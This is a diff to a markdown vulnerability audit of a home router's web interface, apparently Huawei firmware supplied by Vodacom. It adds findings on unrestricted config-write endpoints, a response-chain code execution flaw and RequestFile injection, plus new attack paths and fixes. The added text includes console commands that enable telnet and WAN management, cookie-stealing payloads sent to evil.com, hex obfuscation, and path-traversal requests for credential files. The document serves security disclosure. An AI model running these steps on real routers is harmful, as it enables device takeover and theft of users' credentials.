@@ -40,8 +40,10 @@
 23. [V-23: DVODACOM2WIFI Server-Controlled PBKDF2 Iterations Downgrade](#v-23-dvodacom2wifi-server-controlled-pbkdf2-iterations-downgrade)
 24. [V-24: DOM-Based XSS via innerHTML Without Encoding](#v-24-dom-based-xss-via-innerhtml-without-encoding)
 25. [V-25: TR-069 Paths for Certificate, Key, and Credential Extraction](#v-25-tr-069-paths-for-certificate-key-and-credential-extraction)
-26. [Discovered Endpoints Summary](#discovered-endpoints-summary)
-27. [Potential Privilege Escalation Paths](#potential-privilege-escalation-paths)
+26. [V-26: HWGetAction/ajaxSumitData Arbitrary Authenticated Write](#v-26-hwgetactionajaxsumitdata-arbitrary-authenticated-write)
+27. [V-27: hexDecode + dealDataWithFun Response Chain — RCE via getajax.cgi](#v-27-hexdecode--dealdatawithfun-response-chain--rce-via-getajaxcgi)
+28. [V-28: RequestFile Parameter Injection in CGI Endpoints](#v-28-requestfile-parameter-injection-in-cgi-endpoints)
+29. [Potential Privilege Escalation Paths](#potential-privilege-escalation-paths)
 
 ---
 
@@ -1523,7 +1525,284 @@ credentials, and device databases**:
 - **Full device config tree** can be downloaded via the root path
   `InternetGatewayDevice.`
 
-### Path 1: Password Oracle → Admin Account Takeover
+---
+
+## V-26: HWGetAction/ajaxSumitData Arbitrary Authenticated Write
+
+**Severity**: CRITICAL  
+**File**: `util.js` lines 2786-2807, 3340-3353  
+**Type**: Arbitrary config write / internal file overwrite
+
+### Description
+
+The `HWGetAction()` and `ajaxSumitData()` functions allow an authenticated
+user to POST arbitrary data to **any URL** on the router.  These are generic
+write functions used by all admin pages to modify the device configuration:
+
+```javascript
+// util.js line 2786 — accepts ANY URL
+function HWGetAction(Url, ParameterList, tokenvalue) {
+    var tokenstring = (null == tokenvalue) ? "" : ("x.X_HW_Token=" + tokenvalue);
+    $.ajax({
+        type : "POST",
+        url : Url,                         // ← No URL validation
+        data: ParameterList + tokenstring,  // ← Arbitrary parameters
+        success : function(data) { ResultTmp = hexDecode(data); }
+    });
+}
+
+// util.js line 3340 — auto-adds token then POSTs to any path
+function ajaxSumitData(path, submitData, isLogin, callBack) {
+    $.ajax({
+        type: 'POST',
+        url: path,                                   // ← Any path
+        data: getDataWithToken(submitData, isLogin),  // ← Auto-token
+        success: function (data) { callBack(dealDataWithFun(data)); }
+    });
+}
+```
+
+### Attack — Write Configuration via getajax.cgi / setajax.cgi
+
+While `getajax.cgi` reads TR-069 objects, the write counterpart accepts
+parameter-value pairs.  The `HWGetAction()` function can be called from the
+browser console after authenticating:
+
+```javascript
+// Browser console — Enable telnet (example)
+HWGetAction(
+    '/setajax.cgi?InternetGatewayDevice.X_HW_CLITelnetAccess.',
+    'Enable=1&LanEnable=1&',
+    GetToken()
+);
+
+// Browser console — Change admin password
+HWGetAction(
+    '/setajax.cgi?InternetGatewayDevice.UserInterface.X_HW_WebUserInfo.2.',
+    'Password=newpassword&',
+    GetToken()
+);
+
+// Browser console — Enable WAN-side management
+HWGetAction(
+    '/setajax.cgi?InternetGatewayDevice.X_HW_Security.AclServices.',
+    'HttpEnable=1&HttpWanPort=8080&',
+    GetToken()
+);
+```
+
+### Known Write Endpoints
+
+| Endpoint | Purpose |
+|----------|---------|
+| `/setajax.cgi?{ObjPath}` | Write TR-069 parameters |
+| `/cfgaction.cgi` | Config backup/restore/factory-reset |
+| `/configservice.cgi` | Service configuration |
+| `/set.cgi` | Generic parameter setter |
+| `/html/ssmp/default/set.cgi` | Per-module parameter setter |
+
+### Impact
+
+- **Full device configuration modification** with any admin session
+- **Enable Telnet/SSH** from browser console
+- **Change all passwords** (admin, normal, WiFi, PPPoE, VoIP)
+- **Open WAN-side management** (expose admin panel to internet)
+- **Modify firewall rules** to allow inbound traffic
+- **Redirect DNS** to attacker-controlled server
+- Combined with V-19 (Userlevel escalation), a normal user can write
+  admin-level configuration
+
+---
+
+## V-27: hexDecode + dealDataWithFun Response Chain — RCE via getajax.cgi
+
+**Severity**: CRITICAL  
+**File**: `util.js` lines 2768, 3261-3273, 3287-3298  
+**Type**: Remote code execution via response injection
+
+### Description
+
+Every HTTP response from the router's CGI endpoints passes through a
+two-stage processing chain before reaching JavaScript code:
+
+```
+Server Response → hexDecode() → dealDataWithFun() → Application Code
+```
+
+**Stage 1 — `hexDecode()`** (line 3261):
+```javascript
+function hexDecode(str) {
+    if (typeof str === 'string' && /\\x(\w{2})/.test(str)) {
+        return str.replace(/\\x(\w{2})/g, function(_, $1) {
+            return String.fromCharCode(parseInt($1, 16));
+        });
+    }
+    return str;
+}
+```
+
+**Stage 2 — `dealDataWithFun()`** (line 3268):
+```javascript
+function dealDataWithFun(str) {
+    if (typeof str === 'string' && str.indexOf('function') === 0) {
+        return Function('"use strict";return (' + str + ')')()();
+    }
+    return str;
+}
+```
+
+This chain is used by **every data-fetching function** in util.js:
+
+| Function | Line | Uses hexDecode | Uses dealDataWithFun |
+|----------|------|---------------|---------------------|
+| `HwAjaxGetPara()` | 2768 | ✅ | via return | 
+| `CheckHwAjaxRet()` | 2776 | ✅ | — |
+| `HWGetAction()` | 2796 | ✅ | — |
+| `ajaxGetAspData()` | 3291 | — | ✅ |
+| `getDynamicData()` | 3308 | — | ✅ |
+| `ajaxSumitData()` | 3349 | — | ✅ |
+
+### Attack — MITM Code Injection
+
+Since the router uses **HTTP** (not HTTPS), a MITM attacker on the local
+network can intercept **any** response from `getajax.cgi` or any ASP
+endpoint and replace it with executable JavaScript:
+
+```
+Original response:  { "WLANEnable": "1", "SSID": "MyWifi" }
+Injected response:  function(){
+    // Steal admin cookie
+    new Image().src='http://evil.com/steal?c='+document.cookie;
+    // Also return valid-looking data to avoid suspicion
+    return { "WLANEnable": "1", "SSID": "MyWifi" };
+}
+```
+
+The `dealDataWithFun()` function checks only that the string starts with
+`"function"` — then executes it as arbitrary JavaScript via the `Function()`
+constructor (equivalent to `eval()`).
+
+### Attack — hexDecode Payload Obfuscation
+
+The `hexDecode()` stage allows payloads to be **hex-obfuscated** to bypass
+any naive content filters:
+
+```
+\x66\x75\x6e\x63\x74\x69\x6f\x6e  →  "function"
+```
+
+A hex-encoded payload that starts with `\x66\x75\x6e\x63\x74\x69\x6f\x6e`
+will pass through `hexDecode()` to become a string starting with `function`,
+which `dealDataWithFun()` will then execute.
+
+### Files Where This Chain Is Active
+
+The `dealDataWithFun()` function appears in three separate files:
+
+1. `util.js` line 3268 — used by `ajaxGetAspData()`, `getDynamicData()`,
+   `ajaxSumitData()`
+2. `safelogin.js` line 507 — used by `ajaxGetAspData()` in auth context
+3. `index.asp` line 381 — used by `loginWithSha256()` for GetRandInfo response
+
+### Impact
+
+- **Remote code execution** in the admin's browser via MITM
+- All TR-069 data queries can be intercepted and replaced with malicious code
+- Combined with ARP spoofing on the LAN, any admin page load triggers RCE
+- The hex-encoding stage provides obfuscation for payloads
+- Since this is in the **login page** (index.asp), even pre-auth traffic
+  is vulnerable (loginWithSha256 DVODACOM2WIFI path)
+
+---
+
+## V-28: RequestFile Parameter Injection in CGI Endpoints
+
+**Severity**: HIGH  
+**File**: `util.js` lines 3121, 3136, 3150; `index.asp` lines 864-882, 966  
+**Type**: Open redirect / path injection
+
+### Description
+
+Multiple CGI endpoints accept a `RequestFile` parameter that controls where
+the browser redirects after the operation completes.  This parameter is
+**not validated** — it's passed directly to the server which issues a
+redirect or includes the specified page:
+
+```javascript
+// util.js — Logout with arbitrary redirect
+'logout.cgi?RequestFile=html/logout.html'              // line 3121
+'logout.cgi?RequestFile=/html/logout.html'             // line 3136
+
+// index.asp — Password change with redirect to login
+'MdfPwdNormalNoLg.cgi?&x=...&RequestFile=login.asp'   // line 864
+
+// index.asp — FrameMode switch with redirect
+'FrameModeSwitch.cgi?&RequestFile=/login.asp'          // line 966
+```
+
+The `LogoutWithPara()` function (util.js line 3141) also accepts a
+`SubmitType` parameter, adding another injection point:
+
+```javascript
+function LogoutWithPara(submitType, location, diffAdminPath, curUser) {
+    var url = '/logout.cgi?';
+    if (submitType != "") {
+        url += '&SubmitType=' + submitType;  // Not sanitized
+    }
+    url += '&RequestFile=/html/logout.html';
+    // ...
+}
+```
+
+### Attack — Open Redirect via RequestFile
+
+```
+/logout.cgi?RequestFile=http://evil.com/phishing/login.html
+/login.cgi?RequestFile=http://evil.com/steal
+/FrameModeSwitch.cgi?RequestFile=http://evil.com/
+```
+
+If the server follows the `RequestFile` parameter for redirects, the user
+is sent to an attacker-controlled page that mimics the router login.
+
+### Attack — Internal File Inclusion via RequestFile
+
+If the server-side CGI treats `RequestFile` as a file path for inclusion
+(common in Huawei's HTTPD), path traversal is possible:
+
+```
+/logout.cgi?RequestFile=../../etc/passwd
+/logout.cgi?RequestFile=../../mnt/jffs2/hw_ctree.xml
+/logout.cgi?RequestFile=../../tmp/hw_ctree.xml
+```
+
+### Attack — SubmitType Parameter Injection
+
+The `SubmitType` parameter in `LogoutWithPara()` is concatenated directly
+into the URL without sanitization:
+
+```
+SubmitType = "1&ExtraParam=injected"
+→ URL: /logout.cgi?&SubmitType=1&ExtraParam=injected&RequestFile=/html/logout.html
+```
+
+### Endpoints Accepting RequestFile
+
+| Endpoint | Parameter | Usage |
+|----------|-----------|-------|
+| `/login.cgi` | `CheckCodeErrFile` | Redirect on captcha error |
+| `/logout.cgi` | `RequestFile` | Post-logout redirect page |
+| `MdfPwdNormalNoLg.cgi` | `RequestFile` | Post-password-change redirect |
+| `MdfPwdAdminNoLg.cgi` | `RequestFile` | Post-password-change redirect |
+| `FrameModeSwitch.cgi` | `RequestFile` | Post-mode-switch redirect |
+
+### Impact
+
+- **Open redirect** — phishing attacks using the router's domain
+- **Internal file read** — if RequestFile triggers server-side file inclusion
+- **Parameter injection** — add extra CGI parameters via unsanitized inputs
+- Combined with V-07 (unauthenticated FrameModeSwitch), an attacker can
+  switch the device mode AND redirect to a phishing page in one request
 
 ```
 1. GET /index.asp → extract errloginlockNum, defaultUsername
@@ -1616,6 +1895,35 @@ credentials, and device databases**:
 5. Clone connects to ISP OLT as the original device
 ```
 
+### Path 11: Config Write → Open WAN Management → Remote Access
+
+```
+1. Login as admin (or escalate via V-19)
+2. HWGetAction('/setajax.cgi?InternetGatewayDevice.X_HW_Security.AclServices.',
+              'HttpEnable=1&HttpWanPort=8080&', GetToken())
+3. Router admin panel now accessible from WAN side on port 8080
+4. Attacker accesses admin panel remotely from the internet
+```
+
+### Path 12: MITM → dealDataWithFun RCE → Full Compromise
+
+```
+1. ARP spoof on local LAN
+2. Intercept any getajax.cgi or ASP response
+3. Replace response with: function(){new Image().src='http://evil.com/?c='+document.cookie;return {}}
+4. hexDecode passes the string, dealDataWithFun executes it
+5. Admin session stolen → attacker controls router
+```
+
+### Path 13: RequestFile Injection → Config File Download
+
+```
+1. POST /logout.cgi?RequestFile=../../mnt/jffs2/hw_ctree.xml
+2. If server includes the file, router XML config is returned
+3. Decrypt config file (AES-128 or XOR, key from hw_boardinfo)
+4. Extract ALL stored passwords, keys, and certificates
+```
+
 ---
 
 ## Recommendations
@@ -1638,3 +1946,6 @@ credentials, and device databases**:
 16. **Use textContent instead of innerHTML** — prevent DOM-based XSS
 17. **Restrict TR-069 certificate/key paths** — never expose private keys via web API
 18. **Encrypt stored credentials** in TR-069 data model
+19. **Restrict `setajax.cgi` / write endpoints** — server-side ACL per user role
+20. **Validate and whitelist `RequestFile` parameter** — prevent path traversal and open redirects
+21. **Remove `hexDecode()` from response chain** — serve JSON directly, parse with `JSON.parse()`
